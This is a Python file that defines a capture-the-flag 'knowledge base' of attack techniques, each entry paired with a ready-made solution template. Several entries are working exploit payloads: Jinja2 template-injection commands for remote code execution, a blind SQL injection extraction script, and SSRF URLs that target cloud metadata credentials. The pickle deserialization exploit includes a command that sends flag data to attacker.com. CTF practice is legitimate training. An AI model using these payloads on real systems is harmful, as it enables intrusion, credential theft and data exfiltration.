from typing import List, Dict, Any

INITIAL_KNOWLEDGE_BASE: List[Dict[str, Any]] = [
    # =========================================================================
    # 1. ADVANCED WEB APPLICATION SECURITY
    # =========================================================================
    {
        "id": "web-adv-001",
        "domain": "Web",
        "title": "Server-Side Template Injection (SSTI) Jinja2 / Mako Sandbox Bypass RCE",
        "keywords": ["ssti", "jinja2", "mako", "sandbox", "rce", "template injection", "subclasses", "mro", "hackquest"],
        "pattern": "User input reflected directly in template rendering (e.g., render_template_string in Flask). Traverse object MRO to reach subprocess.Popen or os.popen to execute arbitrary system commands and exfiltrate flags.",
        "solution_template": "# Payload 1: Universal Python 3 Jinja2 RCE via os._wrap_close:\n{{ ''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['popen']('cat flag* /flag /app/flag*').read() }}\n\n# Payload 2: Attribute-filtered bypass using request dictionary:\n{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id').read() }}\n\n# Payload 3: Hex-encoded string bypass:\n{{ ()['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fbase\\x5f\\x5f']['\\x5f\\x5fsubclasses\\x5f\\x5f']()[137]['__init__']['__globals__']['popen']('ls -la').read() }}"
    },
    {
        "id": "web-adv-002",
        "domain": "Web",
        "title": "Blind Boolean & Time-Based SQLi with Automated Binary Search",
        "keywords": ["blind sqli", "time-based", "boolean", "binary search", "sleep", "sqlite", "mysql", "information_schema"],
        "pattern": "Application does not reflect query results or errors, but changes response behavior (content-length or response delay). Use binary search over ASCII character ranges (32-126) with substr/substr-based conditional queries to exfiltrate table data in O(N log K) requests.",
        "solution_template": "import requests, time\nurl = 'http://target-hackquest.com/profile'\ncookie = {'session': 'xyz'}\nflag = ''\nfor pos in range(1, 50):\n    low, high = 32, 126\n    found = False\n    while low <= high:\n        mid = (low + high) // 2\n        # SQLite / MySQL blind payload:\n        payload = f\"admin' AND (SELECT unicode(substr(flag,{pos},1)) FROM secrets) > {mid} --\"\n        r = requests.get(url, params={'user': payload}, cookies=cookie)\n        if 'Welcome back' in r.text:\n            low = mid + 1\n        else:\n            high = mid - 1\n    flag += chr(low)\n    print(f'[+] Flag extracted so far: {flag}')\n    if flag.endswith('}'): break"
    },
    {
        "id": "web-adv-003",
        "domain": "Web",
        "title": "Insecure Python Object Deserialization (pickle / yaml RCE)",
        "keywords": ["pickle", "deserialization", "pickle.loads", "yaml.load", "__reduce__", "rce"],
        "pattern": "Application accepts base64-encoded serialized Python objects (cookies, session tokens, cached data) and loads them via pickle.loads() or yaml.unsafe_load(). Construct a malicious class with __reduce__() returning os.system or subprocess.check_output.",
        "solution_template": "import pickle, base64, os\nclass Exploit:\n    def __reduce__(self):\n        # Reverse shell or flag exfiltration payload\n        cmd = 'cat /flag* > /tmp/flag.txt; curl http://attacker.com/$(cat /tmp/flag.txt | base64)'\n        return (os.system, (cmd,))\n\npayload = base64.b64encode(pickle.dumps(Exploit())).decode()\nprint('[+] Malicious Serialized Payload:', payload)"
    },
    {
        "id": "web-adv-004",
        "domain": "Web",
        "title": "SSRF with Cloud Metadata Exfiltration & DNS Rebinding",
        "keywords": ["ssrf", "cloud metadata", "169.254.169.254", "internal network", "dns rebinding", "gopher"],
        "pattern": "Application fetches remote URLs (PDF generators, image fetchers, webhook verifiers). Bypass localhost/127.0.0.1 filters using 0x7f000001, 127.1, [::], or query AWS/GCP/Azure instance metadata endpoints to retrieve IAM credentials and flags.",
        "solution_template": "# AWS Metadata v1:\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n# Localhost filter bypasses:\nhttp://0x7f000001:8080/flag\nhttp://127.0.0.1.nip.io/admin\n# Gopher protocol payload to talk to internal Redis/MySQL:\ngopher://127.0.0.1:6379/_SET%20flag%20pwned"
    },

    # =========================================================================
    # 2. ADVANCED CRYPTOGRAPHY & PRNG RECONSTRUCTION
    # =========================================================================
    {
        "id": "crypto-adv-001",
        "domain": "Cryptography",
        "title": "Mersenne Twister (MT19937) State Recovery without Seed (RandCrack)",
        "keywords": ["mt19937", "mersenne twister", "randcrack", "prng state", "random.getrandbits", "seedless", "hackquest"],
        "pattern": "Python's random uses 32-bit MT19937. Knowing 624 consecutive 32-bit integers allows 100% complete state cloning. Once cloned, the attacker can predict all FUTURE and PAST random numbers without knowing the original seed or timestamp.",
        "solution_template": "from randcrack import RandCrack\n# Requires: pip install randcrack\nrc = RandCrack()\n# Feed 624 observed integers from the server:\nfor num in observed_624_numbers:\n    rc.submit(num)\nprint('[+] Cloned MT19937 State successfully!')\n# Predict next outputs exactly identical to server:\npredicted_token = rc.predict_getrandbits(32)\nprint('[+] Predicted Next Secret Token:', predicted_token)"
    },
    {
        "id": "crypto-adv-002",
        "domain": "Cryptography",
        "title": "RSA Wiener's Attack (Small Private Exponent d < n^0.25)",
        "keywords": ["rsa", "wiener", "small d", "continued fractions", "private key recovery", "owip"],
        "pattern": "When the private exponent d is small (d < (1/3) * n^(1/4)), the fraction e/n is close to k/d. Continued fractions expansion of e/n reveals k/d among the convergents, completely breaking RSA private key d in polynomial time.",
        "solution_template": "from owiener import attack\n# pip install owiener\nd = attack(e, n)\nif d:\n    m = pow(c, d, n)\n    print('[+] Recovered Plaintext:', bytes.fromhex(hex(m)[2:]).decode('latin-1'))"
    },
    {
        "id": "crypto-adv-003",
        "domain": "Cryptography",
        "title": "Hash Length Extension Attack (MD5, SHA-1, SHA-256)",
        "keywords": ["length extension", "hashpump", "md5", "sha1", "merkle damgard", "mac forgery"],
        "pattern": "Server validates authentication via Hash(secret || message). Merkle-Damgard hash functions allow appending arbitrary data (e.g. &admin=true) and calculating the valid hash without knowing the secret key.",
        "solution_template": "import hashpumpy\n# pip install hashpumpy\n# hashpumpy.hashpump(original_hash, original_data, data_to_add, key_length)\nnew_hash, new_msg = hashpumpy.hashpump('574f2602767faac17b4b8a7ca0e3b88b', 'user=guest', '&role=admin', 16)\nprint('[+] Forged Hash:', new_hash)\nprint('[+] Forged Payload (with padding):', new_msg)"
    },
    {
        "id": "crypto-adv-004",
        "domain": "Cryptography",
        "title": "Coppersmith Stereotyped Message Attack (Known Plaintext Prefix)",
        "keywords": ["coppersmith", "small root", "sage", "stereotyped", "rsa partial plaintext", "polynomial"],
        "pattern": "Part of the message is known (e.g., m = 'HQX{known_prefix_' + x + '}'). When the unknown portion x is small (x < n^(1/e)), Coppersmith's theorem finds the small root x of the polynomial f(x) = (prefix + x)^e - c mod n in polynomial time.",
        "solution_template": "# Run in SageMath:\n# ZmodN = Zmod(n)\n# P.<x> = PolynomialRing(ZmodN)\n# f = (prefix + x)^e - c\n# roots = f.small_roots(X=2^(8*unknown_len), beta=1.0)\n# print('Flag portion x:', roots[0])"
    },

    # =========================================================================
    # 3. ADVANCED REVERSE ENGINEERING & SYMBOLIC EXECUTION
    # =========================================================================
    {
        "id": "reversing-adv-001",
        "domain": "Binary Exploitation",
        "title": "Automated Symbolic Execution with Angr (Zero-Disassembly Solving)",
        "keywords": ["angr", "symbolic execution", "z3", "solver", "constraint satisfaction", "crackme", "hackquest"],
        "pattern": "Complex binary with nested conditions, XOR scramblers, and checks. Instead of reverse engineering line-by-line, define target 'Correct' and 'Wrong' addresses; Angr automatically calculates the exact input bytes that reach the success state.",
        "solution_template": "import angr, claripy\nproj = angr.Project('./crackme', auto_load_libs=False)\nFLAG_LEN = 32\nflag_chars = [claripy.BVS(f'flag_{i}', 8) for i in range(FLAG_LEN)]\nflag = claripy.Concat(*flag_chars)\nstate = proj.factory.entry_state(args=['./crackme'], stdin=flag)\n# Constrain characters to printable ASCII\nfor c in flag_chars:\n    state.solver.add(c >= 0x20, c <= 0x7e)\nsimgr = proj.factory.simulation_manager(state)\n# Find 'Correct' block, avoid 'Wrong' block\nsimgr.explore(find=lambda s: b'Correct' in s.posix.dumps(1), avoid=lambda s: b'Wrong' in s.posix.dumps(1))\nif simgr.found:\n    print('[+] Solved Flag:', simgr.found[0].solver.eval(flag, cast_to=bytes))"
    },
    {
        "id": "reversing-adv-002",
        "domain": "Binary Exploitation",
        "title": "Anti-Debugging & Ptrace Bypass via LD_PRELOAD Hooking",
        "keywords": ["anti-debugging", "ptrace", "ld_preload", "hook", "gdb", "isdebuggerpresent"],
        "pattern": "Binary detects debuggers using ptrace(PTRACE_TRACEME, 0, 1, 0) or timing checks (RDTSC). Compile a shared library (.so) that intercepts ptrace() and returns 0, or patch the test eax, eax instruction with NOPs (0x90).",
        "solution_template": "# 1. Hook code (hook.c):\n# long ptrace(int request, int pid, void *addr, void *data) { return 0; }\n# 2. Compile shared library:\n# gcc -shared -fPIC hook.c -o hook.so\n# 3. Run target bypassing ptrace:\n# LD_PRELOAD=./hook.so gdb ./challenge"
    },
    {
        "id": "reversing-adv-003",
        "domain": "Binary Exploitation",
        "title": "Python Bytecode Disassembly & Opcode Recovery (pycdc / dis)",
        "keywords": ["pycdc", "bytecode", "opcode", "python reversing", "pyc", "uncompyle6"],
        "pattern": "When automated decompilers like uncompyle6 fail due to Python 3.10+ opcode changes or obfuscated headers. Use python's built-in dis module or pycdc (decompyle++) to reconstruct the control flow and XOR key constants directly from bytecode.",
        "solution_template": "import dis, marshal\nwith open('challenge.pyc', 'rb') as f:\n    f.seek(16) # Skip 16-byte header\n    code_obj = marshal.load(f)\nprint('[+] Disassembled Bytecode:')\ndis.dis(code_obj)"
    },

    # =========================================================================
    # 4. ADVANCED FORENSICS & MALWARE / LOG ANALYSIS
    # =========================================================================
    {
        "id": "forensics-adv-001",
        "domain": "Forensics",
        "title": "USB HID Keystroke Packet Carving from PCAP",
        "keywords": ["usb hid", "keystroke", "pcap", "wireshark", "keyboard capture", "usb.capdata", "hackquest"],
        "pattern": "A network capture file (.pcap) containing USB traffic where a user typed a password or flag. Extract USB HID Leftover Capture Data (8-byte packets), map byte 2 (HID Keycode) to keyboard ASCII characters, and account for Shift key status (byte 0).",
        "solution_template": "import pyshark\n# HID keycode map table (0x04='a', 0x1e='1', etc.)\nHID_MAP = {4:'a',5:'b',6:'c',7:'d',8:'e',9:'f',10:'g',11:'h',12:'i',13:'j',14:'k',15:'l',16:'m',17:'n',18:'o',19:'p',20:'q',21:'r',22:'s',23:'t',24:'u',25:'v',26:'w',27:'x',28:'y',29:'z',30:'1',31:'2',32:'3',33:'4',34:'5',35:'6',36:'7',37:'8',38:'9',39:'0',40:'\\n',44:' ',45:'-',46:'=',47:'[',48:']',49:'\\\\',51:';',52:'\\'',54:',',55:'.',56:'/'}\n# Extract using tshark: tshark -r capture.pcap -Y 'usb.capdata' -T fields -e usb.capdata > keys.txt"
    },
    {
        "id": "forensics-adv-002",
        "domain": "Forensics",
        "title": "Memory Dump Analysis with Volatility 3 (Process Injection & Secrets)",
        "keywords": ["volatility", "volatility3", "memory dump", "lsass", "malfind", "hivelist", "hashdump"],
        "pattern": "Memory dump file (.raw, .dmp, .vmem). Use Volatility 3 to detect hidden/injected processes (malfind), dump command line histories (cmdline), extract passwords from memory (hashdump / lsass), and carve dropped executable payloads.",
        "solution_template": "# 1. Scan for injected code:\nvol -f memory.raw windows.malfind\n# 2. Extract command line arguments executed:\nvol -f memory.raw windows.cmdline\n# 3. Dump registry password hashes:\nvol -f memory.raw windows.hashdump\n# 4. Dump specific process memory:\nvol -f memory.raw windows.memmap --pid <PID> --dump"
    },
    {
        "id": "forensics-adv-003",
        "domain": "Forensics",
        "title": "Steghide Dictionary Brute-Force & Passphrase Cracking",
        "keywords": ["steghide", "stegseek", "rockyou", "audio steganography", "embedded file"],
        "pattern": "JPEG or WAV files protected by steghide encryption. Use stegseek (which cracks steghide passphrases in seconds using wordlists) or python subprocess wrapper over steghide extract.",
        "solution_template": "# Run ultra-fast stegseek:\n# stegseek secret.jpg rockyou.txt\n# Standard python loop:\nimport subprocess\nwith open('rockyou.txt', 'r', encoding='latin-1') as f:\n    for pwd in f:\n        p = pwd.strip()\n        res = subprocess.run(['steghide', 'extract', '-sf', 'target.jpg', '-p', p, '-f'], capture_output=True)\n        if b'wrote extracted data' in res.stdout or b'wrote extracted data' in res.stderr:\n            print('[+] Found Steghide Passphrase:', p)\n            break"
    }
]
